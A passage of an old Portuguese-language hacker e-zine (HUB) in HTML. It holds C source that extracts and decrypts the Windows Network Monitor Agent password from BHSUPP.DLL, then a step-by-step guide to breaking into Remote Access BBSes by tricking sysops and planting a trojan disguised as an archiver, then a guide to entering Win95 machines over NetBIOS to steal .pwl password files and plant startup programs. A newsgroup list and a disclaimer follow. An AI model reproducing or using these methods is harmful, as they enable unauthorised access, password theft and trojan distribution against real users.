+&nbsp;&nbsp;&nbsp;&nbsp; g_hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; if(argc > 1 &amp;&amp; argv[1][0] == '/' &amp;&amp; argv[1][1] == '?')
+&nbsp;&nbsp;&nbsp;&nbsp; {
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WriteFile(g_hStdOut, lpszUsage, sizeof(lpszUsage), &amp;nCount, NULL);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExitProcess(0L);
+&nbsp;&nbsp;&nbsp;&nbsp; }
+
+&nbsp;&nbsp;&nbsp;&nbsp; if(argc == 1)
+&nbsp;&nbsp;&nbsp;&nbsp; {
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nCount = GetSystemDirectory(lpszSystemDirectory, 0);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lpszSystemDirectory = malloc(nCount);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(lpszSystemDirectory == NULL)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp; WriteFile(g_hStdOut, "Memory Allocation Failure - Terminating\n",&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 41, &amp;nCount, NULL);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExitProcess(1L);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GetSystemDirectory(lpszSystemDirectory, nCount);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sprintf(lpszTargetFile, "%s\\bhsupp.dll", lpszSystemDirectory);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; free(lpszSystemDirectory);
+&nbsp;&nbsp;&nbsp;&nbsp; }
+&nbsp;&nbsp;&nbsp;&nbsp; else
+&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp; strcpy(lpszTargetFile, argv[1]);&nbsp;&nbsp;&nbsp;&nbsp; }
+&nbsp;&nbsp;&nbsp;&nbsp; hTargetFile = CreateFile(lpszTargetFile, GENERIC_READ, FILE_SHARE_READ&nbsp;
+|&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FILE_SHARE_WRITE, NULL, OPEN_EXISTING,&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FILE_FLAG_SEQUENTIAL_SCAN, NULL);
+
+&nbsp;&nbsp;&nbsp;&nbsp; //if not on the commandline or in the system dir ask user for path
+&nbsp;&nbsp;&nbsp;&nbsp; if(hTargetFile == INVALID_HANDLE_VALUE &amp;&amp; argc == 1)
+&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp; GetTargetFileFromUser(&amp;hTargetFile, lpszTargetFile);&nbsp;&nbsp;&nbsp;&nbsp; }
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; else if(hTargetFile == INVALID_HANDLE_VALUE)
+&nbsp;&nbsp;&nbsp;&nbsp; {
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nCount2 = sprintf(lpszOutputBuffer, "\nUnable to open %s\n",&nbsp;
+lpszTargetFile);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WriteFile(g_hStdOut, lpszOutputBuffer, nCount2, &amp;nCount, NULL);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExitProcess(1L);
+&nbsp;&nbsp;&nbsp;&nbsp; }
+
+&nbsp;&nbsp;&nbsp;&nbsp; if(!GetEncryptedPassword(hTargetFile, lpEncryptedPassword))
+&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp; WriteFile(g_hStdOut, "Unable to retrieve encrypted password\n",
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 39, &amp;nCount, NULL);
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExitProcess(1L);
+&nbsp;&nbsp;&nbsp;&nbsp; }
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; CloseHandle(hTargetFile);
+&nbsp;&nbsp;&nbsp;&nbsp; DecryptPassword(lpEncryptedPassword, lpszPlaintextPassword);
+&nbsp;&nbsp;&nbsp;&nbsp; nCount2 = sprintf(lpszOutputBuffer,&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\nThe Network Monitor Agent capture password is %s\n",
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lpszPlaintextPassword);
+&nbsp;&nbsp;&nbsp;&nbsp; WriteFile(g_hStdOut, lpszOutputBuffer, nCount2, &amp;nCount, NULL);
+&nbsp;&nbsp;&nbsp;&nbsp; CloseHandle(g_hStdIn);
+&nbsp;&nbsp;&nbsp;&nbsp; CloseHandle(g_hStdOut);
+&nbsp;&nbsp;&nbsp;&nbsp; ExitProcess(0L);
+}
+
+void DecryptPassword(LPBYTE lpEncryptedPassword, LPSTR&nbsp;
+lpszPlaintextPassword)
+{
+&nbsp;&nbsp;&nbsp; register int outer, inner;
+&nbsp;&nbsp;&nbsp;&nbsp; for ( outer = 31; outer >= 0; outer-- )
+&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp; for ( inner = 31; inner >= 0; inner-- )
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; { if ( outer != inner )
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp; lpEncryptedPassword[inner] ^= lpEncryptedPassword[outer] +&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (outer ^ inner) + inner;
+&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp; } }
+&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; memcpy(lpszPlaintextPassword, lpEncryptedPassword, 16);
+&nbsp;&nbsp;&nbsp;&nbsp; lpszPlaintextPassword[16] = 0L;
+&nbsp;&nbsp;&nbsp;&nbsp; return;
+}
+
+void GetTargetFileFromUser(HANDLE* phTargetFile, LPSTR lpszTargetFile)
+{
+&nbsp;&nbsp;&nbsp;&nbsp; char lpszPrompt[] = "\nFull path to BHSUPP.DLL including file name: ";
+&nbsp;&nbsp;&nbsp;&nbsp; UINT nCount;
+&nbsp;&nbsp;&nbsp;&nbsp; WriteFile(g_hStdOut, lpszPrompt, sizeof(lpszPrompt), &amp;nCount, NULL);
+&nbsp;&nbsp;&nbsp;&nbsp; ReadFile(g_hStdIn, lpszTargetFile, MAX_PATH, &amp;nCount, NULL);
+&nbsp;&nbsp;&nbsp;&nbsp; lpszTargetFile[nCount - 2] = 0L;
+&nbsp;&nbsp;&nbsp;&nbsp; *phTargetFile = CreateFile(lpszTargetFile, GENERIC_READ,&nbsp;
+FILE_SHARE_READ |&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FILE_SHARE_WRITE, NULL, OPEN_EXISTING,&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FILE_FLAG_SEQUENTIAL_SCAN, NULL);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; if(*phTargetFile == INVALID_HANDLE_VALUE)
+&nbsp;&nbsp;&nbsp;&nbsp; {
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WriteFile(g_hStdOut, "Unable to open BHSUPP.DLL\n",
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 26, &amp;nCount, NULL);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExitProcess(1L);
+}&nbsp;&nbsp; }
+
+BOOL GetEncryptedPassword(HANDLE hTargetFile, LPBYTE&nbsp;
+lpEncryptedPassword)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+{&nbsp;&nbsp;&nbsp;&nbsp; LPBYTE lpSearchBuffer;
+&nbsp;&nbsp;&nbsp;&nbsp; UINT nCount, i;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; lpSearchBuffer = malloc(MAX_FILE_SIZE);
+&nbsp;&nbsp;&nbsp;&nbsp; if(lpSearchBuffer == NULL)
+&nbsp;&nbsp;&nbsp;&nbsp; { WriteFile(g_hStdOut, "Memory Allocation Failure - Terminating\n",&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 41, &amp;nCount, NULL);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExitProcess(1L);
+&nbsp;&nbsp;&nbsp;&nbsp; }
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; ReadFile(hTargetFile, lpSearchBuffer, MAX_FILE_SIZE, &amp;nCount, NULL);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; for(i=0; i<ncount; i++)
+     {     if(lpsearchbuffer[i] == 'r' && lpsearchbuffer[i+14] == '-')
+          {     if(lpsearchbuffer[i+1] == 't' && lpsearchbuffer[i+2] == 's' &&
+                  lpsearchbuffer[i+3] == 's' && lpsearchbuffer[i+4] == '&' &&
+                  lpsearchbuffer[i+8] == 'b')
+               {  memcpy(lpencryptedpassword, &lpsearchbuffer[i+48], 32);
+                    
+                    free(lpsearchbuffer);
+                    return true;
+     }     }     }
+     
+     free(lpsearchbuffer);
+     
+     return false;
+}
+______________________________________________________________________
+______________________recorte_daqui_pra_cima__________________________
+</pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+
+OBS: Se vc nao conseguir compilar, nao me mande emails perguntando como&nbsp;
+se faz isso, desista....</pre>
+
+<p><a href="#inicio">Volta ao início</a>
+
+<p><a name="ra"><hr></a><p>
+
+<h1>Hackeando um BBS em Remote Access</h1>
+
+Quem nunca se questionou ... "como fa&ccedil;o para hackear um BBS que
+use o Remote Access ?"
+
+<p>A resposta e muito mais f&aacute;cil do que se imagina . E para isso
+voce n&atilde;o precisa ser um Super Mega
+<br>Ultra Hacker !!!
+
+<p>Se voce n&atilde;o fez teste de QI .... fa&ccedil;a, se j&aacute; fez,
+e ele for inferior a 30, por favor N&Atilde;O leia esta mat&eacute;ria
+<br>pois ir&aacute; dar um pequeno n&oacute; em seu c&eacute;rebro de azeitona
+! Mas para os outros (QI acima de 30) vamos l&aacute;,
+<br>vou passar pra voc&ecirc;s um "truquinho" que j&aacute; me ajudou muito,
+a um tempo atr&aacute;s, la vai !
+
+<p>1&ordm; Passo = Instale o Terminate (de prefer&ecirc;ncia o 4 ou 5)
+
+<p>2&ordm; Passo = Arrume o telefone de um BBS (que use RA &eacute; &Oacute;BVIO)
+n&atilde;o perca seu precioso tempo ligando
+<br>para a STI, pois contra esse "bug", eles j&aacute; est&atilde;o protegidos
+&agrave; muito tempo. Tenha como prefer&ecirc;ncia BBS’s
+<br>pequenas, e novas, por que na maioria desses casos os Sysop’s s&atilde;o
+umas antas !
+
+<p>3&ordm; Passo = Induza o Sysop a instalar o protocolo Puma/Mpt em seu
+sistema.
+<br>Pergunta :Como ?
+<br>R: Chaveca o coitado … faz "amizade" com ele e convence ele que ser&aacute;
+um lucro enorme instalar o Puma,
+<br>se ele n&atilde;o for l&aacute; muito esperto, cair&aacute; f&aacute;cil,
+tudo vai depender do seu poder de indu&ccedil;&atilde;o...
+
+<p>Outra forma &eacute; colocar o protocolo em um Horse Trojan, e dar um
+Upload com uma descri&ccedil;&atilde;o que deixe o
+<br>Sysop louquinho pra rodar seu "ARJ 2.76", "PKZIP 3.0" invente alguma
+coisa que deixaria voc&ecirc; com
+<br>vontade de puxar o arquivo !
+
+<p>4&ordm; Passo = Ap&oacute;s o Sysop ter instalado o protocolo Puma /Mtp,
+conecte no BBS dele, ap&oacute;s a conex&atilde;o,
+<br>pressione a tecla SCROLL LOCK , tecla que ativa o "Door Way Mode" e
+selecione qualquer arquivo do
+<br>BBS para download, inicie a transfer&ecirc;ncia normalmente. Durante
+a transmiss&atilde;o aperte CTRL+A ou ALT+A,
+<br>ai vem a a parte boa!!!!!!! Voce vai diretamente para o DOS do BBS
+em Remote Mode .
+
+<p>5&ordm; Passo = Procurem o USERS.BBS e puxem ele!
+<br>T&aacute; bom, t&aacute; bom, eu sei que o RA tem uma prote&ccedil;&atilde;o
+que encripta as senhas impedindo que alguem as
+<br>visualize.
+<br>Pergunta : E agora... pra que esse trabalho todo se n&atilde;o posso
+ver as senhas ?????
+<br>R: Calma a&iacute; nervozinho !!!! Tem um arquivo por a&iacute; que
+quebra as senhas, deixando tudo prontinho pra
+<br>voc&ecirc;!
+
+<p>&nbsp;Pergunta: onde arrumo o programa ???
+<br>R: Procura n&eacute; … j&aacute; ajudei de mais, qualquer BBS com arquivos
+de hacking tem esse arquivinho !
+
+<p>Dica: O nome do arquivo &eacute; RAPWD.ARJ (deve haver outros rodando
+por ai)
+
+<p>Se vc n&atilde;o conseguir … volte ao psic&oacute;logo e refaca seu
+teste de QI!!!
+<br>Brincadeirinha !!!!
+
+<p>&nbsp;[]’ ARG
+<br><a href="#inicio">Volta ao início</a>
+
+<p><a name="News"><hr></a><p>
+
+<h1>Servidores P&uacute;blicos de News Groups</h1>
+Diversas vezes me perguntaram onde conseguir um servidor gratuito de news
+groups, por isso resolvi
+<br>compilar essa lista pequena somente de endere&ccedil;os onde conseguir
+um bom acesso &agrave;, literalmente, milhares
+<br>de News Groups pelo mundo &agrave; fora de forma r&aacute;pida e f&aacute;cil.
+
+<p>Como o site que eu utilizava pra localizar um servidor pr&oacute;ximo
+est&aacute; temporariamentente fora do ar eu
+<br>resovi colocar uma lista de sites onde voc&ecirc; pode por conta pr&oacute;pria
+localizar um servidor de sua
+<br>prefer&ecirc;ncia. RTFM bro! eheheh...
+<ul>
+<li>
+<a href="http://www.geocities.com/siliconvalley/pines/3959/usenet.html">http://www.geocities.com/SiliconValley/Pines/3959/usenet.html</a>:
+Lista de News Publicos</li>
+
+<li>
+<a href="http://www.zippo.com/">http://www.zippo.com/</a>: Web News Reader</li>
+
+<li>
+<a href="http://www.feedme.org/">http://www.feedme.org/</a>: Web News Reader</li>
+
+<li>
+<a href="http://www.freenewsgroups.com/">http://www.freenewsgroups.com/</a>:
+Lista de News Servers gratuitos.</li>
+
+<li>
+<a href="http://www.reed.edu/~greaber/url-servers.html">http://www.reed.edu/~greaber/url-servers.html</a></li>
+
+<li>
+<a href="http://www.billyboard.com/">http://www.billyboard.com/</a></li>
+</ul>
+Overall.
+
+<p><a href="#inicio">Volta ao início</a>
+
+<p><a name="netbeui"><hr></a><p>
+
+<h1>Hackeando o Win95</h1>
+A Microsoft definitivamente nunca afirmou que o Windows 95 ( ou algum de seus antecessores do DOS) fosse serguro. De fato, eles oferecem produtos diferentes parta pessoas preocupadas com seguranca. Na enorme rede que e a Internet, que cresce dia a dia, deve haver cerca de 1000 usu&aacute;rios novos a cada dia em todo o mundo. Uma grande parte da Internet n&atilde;o &eacute; composta apenas por servidores e mainframes, mas sim computadores pessoais, sendo que a maioria deles ultiliza como sistema operacional o programa que Microsoft se orgulha tanto, do qual fez muita propaganda na &eacute;poca de seu lancamento, o Windows 95.<p>
+
+Por que os usu&aacute;rios da Internet n&atilde;o se preocupam com a seguran&ccedil;a??<br>
+Poucas pessoas sabem que todos os recursos de rede estao dispon&iacute;veis, como padr&atilde;o, em qualquer coneccao TCP, sendo essa mesmo uma PPP ou SLIP discada para a maioria dos ISP’s. Poucas pessoas filtram as portas apropriadas em seus firewalls, deixando a maioria das m&aacute;quinas conectadas com acesso livre e completo pelo NetBIOS. Provavelmente, o compartilhamento dos drives e/ou diret&oacute;rios &eacute; muito conveniente, e as pessoas n&atilde;o v&ecirc;em que est&atilde;o abrindo as portas de seus computadores para "espertinhos" principalmente, sendo que de cada 3 usuarios, 1 tem o compartilhamento sem as devidas prote&ccedil;&otilde;es por senha.
+<p>
+Para os usu&aacute;rios que realmente se preocupam com o uso de senhas, na maioria dos casos, utilizam uma senha muito &oacute;bvia, e sem precisar se logar, sem demora, ou algum outro problema de hackear senhas, de 3 a 7 senhas podem ser descobertas por segundo atrav&eacute;s da Net.
+<p>
+Recentemente, um bug foi descoberto na maioria das vers&otilde;es do Windows 95, que causava o travamento do OS, quando uma por&ccedil;&atilde;o (out-of-band) de dados &eacute; enviado para uma porta de TCP. Uma vez que todas as m&aacute;quinas que rodam o Win 95 reservavam, por padr&atilde;o, a porta 139 para conec&ccedil;&otilde;es de NBT, a forma de ataque padr&atilde;o era conectar-se nesta porta e enviar dados OOB.
+<p>
+A Microsoft correu e lan&ccedil;ou um patch que consertava esse bug no Win NT, mas a resposta da empresa para o Win 95 foi muito mais lenta. O patch inicial era lan&ccedil;ar um registro que desabilitava NBT e recomendava desligar qualquer outra porta, tal como a 113 (identd). Isso causou com que um grande n&uacute;mero de "surfistas virtuais" ficassem invulner&aacute;veis a esses ataques. A Am&eacute;rica Online tamb&eacute;m come&ccedil;ou a filtrar essa porta, tal como a UPD 137 (nbnames), fazendo com que muitos lammers ficassem protegidos. (Still plenty of phish in the c)
+<p>
+Tudo que &eacute; preciso para acessar uma m&aacute;quina atrav&eacute;s da NBT, &eacute; o nome da m&aacute;quina na configura&ccedil;&atilde;o do NetBIOS e seu endereco IP. A maravilhosa Microsoft tambem incluiu no Windows 95 e NT, uma ferramenta que vai mostrar as configura&ccedil;&otilde;es da NetBIOS da m&aacute;quina remota, incluindo o nome da m&aacute;quina, login e nome de dom&iacute;nio, os quais quase sempre fazem parte da senha de compartilhamento.
+<p>
+Para acessar uma m&aacute;quina via de NBT, capture o nome da m&aacute;quina a ser conectada usando o nbtstat.exe (nbtstat -A ip, sendo que o nome da m&aacute;quina &eacute; geralmente listado primeiro).
+<p>
+Coloque o IP e o nome da m&aacute;quina num arquivo chamado "lmhosts" no seu diret&oacute;rio do Windows, sendo que cada um fique em uma linha, e pronto, voce conseguir&aacute; acessar a outra maquina pelo nome e usar qualquer fun&ccedil;&atilde;o de rede, tais como \\maquina, net use \\maquina\res, start \\maquina, ping maquina, winnuke maquina, etc...
+<p>
+Uma vez que o acesso foi conseguido, pelo diret&oacute;rio do Windows (ou pela senha do ADMIN$, ou por qualquer outra), os arquivos de senha podem ser obtidos e decriptados ultilizando uma varia&ccedil;&atilde;o do glide code, e voil&aacute;: todas as senhas do usu&aacute;rio, incluindo a das conec&ccedil;&otilde;es dial-up, qualquer senha da web, e senhas para todos os recursos de rede que eles tenham acessado.
+<p>
+Uma lista dos documentos mais recentes acessados pelo usu&aacute;rio podem ser encontrados na pasta "recent", o desktop pode ser manipulado diretamente pelo diret&oacute;rio "\windows\desktop", bem como o menu Iniciar, pelo diretorio "Start Menu\Programs", se voc&ecirc; renomear o diret&oacute;rio de fontes, e resetar a m&aacute;quina, o windows vai exibit a mensgem: "N&atilde;o foi poss&iacute;vel carregar o gdi.exe. Por favor reinstale o Windows." N&atilde;o se esque&ccedil;a de deletar netstat.exe e netwatch.exe para ficar um muito mais invis&iacute;vel.
+<p>
+Pra que isso pode ser &uacute;til??
+<p>
+<b>Conseguir contas dial-up no provedor de sua escolha:</b>
+Procure atraves das conexoes dial-up’s ate achar uma m&aacute;quina que tenha o diret&oacute;rio do windows compartilhado e copie o(s) arquivo(s) .pwl dela. Quando foi mostrado que o sistema de criptografia dos arquivos .pwl da Microsoft parecia uma brincadeira de crianca, a Microsoft percebeu e lancou um patch, e tamb&eacute;m nas vers&otilde;es posteriores do Win 95, os arquivos ficaram mais escondidos e, que eu saiba, ningu&eacute;m conseguiu decriptar o arquivo por enquanto, mas eu n&atilde;o tenho certeza se ainda continuam tentando. Mas mesmo assim, ainda estamos bem. A maoiria das pessoas est&aacute; ultilizando a vers&atilde;o com o bug, ent&atilde;o, continue procurando at&eacute; conseguir abrir um desses. Algumas senhas tamb&eacute;m podem ser encontradas em programas de FTP, como o WSFTP, o CuteFTP, e decodificadores podem ser encontrados para seus bancos de dados de senhas. Pegue tudo o que voce quiser; use o IRC para encontrar pessoas que tenham estes recursos disponiveis em seu computador. Use o diretorio "Recent" para encontrar arquivos interessantes, arquivos .lnk, arquivos de atalhos para programas e arquivos que o usu&aacute;rio geralmente ultilize. Tamb&eacute;m ultilize programas de cliente e servidor de FTP para encontrar diret&oacute;rios de arquivos downloadados e/ou zipados.
+<p>
+<b>Abra programas na maquina remota:</b>
+Voce pode colocar links no diret&oacute;rio "Startup" da pessoa para rodar o programa de sua escolha. Os arquivos ".exe" e ".lnk", s&atilde;o particularmente muito &uacute;teis, por que eles n&atilde;o aparecem na listagem dos &uacute;ltimos documentos ultilizados, na pasta "Recent". Use isto para criar uma bagun&ccedil;a e ocupar bastante o processador do computador, ou abrir um programna com a mensagem de sua escolha.
+<p>
+Ent&atilde;o, concluindo, Uma vez que a &uacute;nica prote&ccedil;&atilde;o que o usu&aacute;rio pode ultilizar no modo compartilhado &eacute; o uso adequado de senhas, estas podem ter no m&aacute;ximo 8 caracteres e n&atilde;o s&atilde;o  case-sensitive, escolha uma muito boa, e at&eacute; a pessoa come&ccedil;ar a desconfiar (o que nao vai ser muito dificil), voc&ecirc; pode se divertir brincando com os arquivos dos usu&aacute;rios.
+<p>
+<b>* * * Traduzido por <a href="mailto:polamsky@away.com.br">Polamsky</a> * * *</b>
+
+<p><a href="#inicio">Volta ao início</a>
+
+<p><a name="ultnot"><hr></a><p>
+
+<h1>&Uacute;ltimas Not&iacute;cias</h1>
+Acaba de ser lan&ccedil;ada mais uma vers&atilde;o da Barata El&eacute;trica.
+
+<p>Pra quem n&atilde;o sabe, a Barata El&eacute;trica foi a primeira zine
+hacker Brasileira e seu autor ficou conhecido at&eacute;
+<br>mesmo pela cena hacker Internacional, tendo j&aacute; participado de
+encontros na Argentina, na Holanda e EUA.
+
+<p>A Barata El&eacute;trica &eacute; considerada por muitos como a fonte
+b&aacute;sica de consulta e conhecimento Hacker,
+<br>tendo ajudado muitos curiosos a se tornarem, se n&atilde;o hackers,
+pelo menos wannabes, e para outros mostra
+<br>o caminho at&eacute; hoje.
+
+<p>A grande qualidade da Barata El&eacute;trica est&aacute; em um fato
+que muitos n&atilde;o aprovam: nela seu autor n&atilde;o passa
+<br>nenhuma receitinha de bolo, ele mostra o caminho e incentiva a pesquisa
+e a curiosidade, que s&atilde;o as atitudes
+<br>mais importantes de um verdadeiro hacker.
+
+<p>Voc&ecirc; encontra a BE nos seguintes endere&ccedil;os:
+<br><a href="http://www.geocities.com/SiliconValley/5620">http://www.geocities.com/SiliconValley/5620</a>
+<br><a href="http://barata-eletrica.home.ml.org">http://barata-eletrica.home.ml.org</a>
+<br><a href="http://hackhour.com.br/textos/ezine/be">http://hackhour.com.br/textos/ezine/be</a>
+
+<p><a href="#inicio">Volta ao início</a>
+
+<p><a name="creditos"><hr></a><p>
+
+<h1>Cr&eacute;ditos e Agradecimentos</h1>
+Gostaria de agrade&ccedil;er todo pessoal que desde o in&iacute;cio tem incentivado a cria&ccedil;ao da HUB, o pessoal que tem ido aos Hack Hour´s e que tem colaborado com id&eacute;ias, apoio ou outras formas, mas principalmente os colaboradores desta edi&ccedil;&atilde;o:<br>
+<ul>
+<li>Cyber Optik pelo sniffer para NT</li>
+<li>ARG pelo texto sobre o RA</li>
+<li>Polamsky pela tradu&ccedil;&atilde;o do texto sobre hacking no W95</li>
+</ul>
+Você encontra a HUB no site do <a href="http://hackhour.com.br" target="_top">Hack Hour</a>.
+<p>
+Se preferir receber a eZine por email, envie email para <a href="mailto:hub@hackhour.com.br">hub@hackhour.com.br</a> sem subject e com o texto "SEND HUB".
+
+<p><a href="#inicio">Volta ao início</a>
+
+<p><a name="avisos"><hr></a><p>
+
+<font size="2" face="Arial,Helvetica,Verdana" color="#008000"><i>
+<b>Nota do Editor:</b> N&oacute;s da HUB n&atilde;o incentivamos que voc&ecirc; utilize de forma maliciosa, nenhuma das informa&ccedil;&otilde;es contidades nesta publica&ccedil;&atilde;o. Todo o conte&uacute;do desta eZine foi produzido/traduzido com a inten&ccedil;&atilde;o de alert&aacute;-los dos perigos que todos podem estar correndo se os recursos de rede e compartilhamento que todos utilizamos diariamente n&atilde;o forem utilizados adequadamente. Se vc utilizar estas informa&ccedil;&otilde;es para danificar ou prejudicar qualquer pessoa, m&aacute;quina ou empresa, n&oacute;s n&atilde;o nos responsabilizamos por suas atitudes.
+<p>
+Ali&aacute;s, n&atilde;o nos responsabilizamos por suas atitudes independente de quais foram suas fontes de informa&ccedil;&otilde;es. Antes de utilizar este conhecimento de forma maliciosa, lembre-se apenas de que existem leis internacionais rigorosas para previnir este tipo de atitude.
+<p>
+A HUB n&atilde;o se responsabiliza pelas opini&otilde;es e conceitos emitidos em textos assinados. O material produzido pela equipe da HUB n&atilde;o poder&aacute; ser reproduzido sem que os cr&eacute;ditos do autor e edi&ccedil;&atilde;o apare&ccedil;am anexados ao mesmo.
+<p>
+Todas as marcas registradas sobre nomes, produtos, equipamentos ou qualquer outra citada nesta edi&ccedil;&atilde;o pertencem &aacute; seus respectivos propriet&aacute;rios.
+</i></font>
+<br><br><br><p>
+<br><br><br><p>
+<br><br><br><p>
+<br><br><br><p>
+<br><br><br><p>
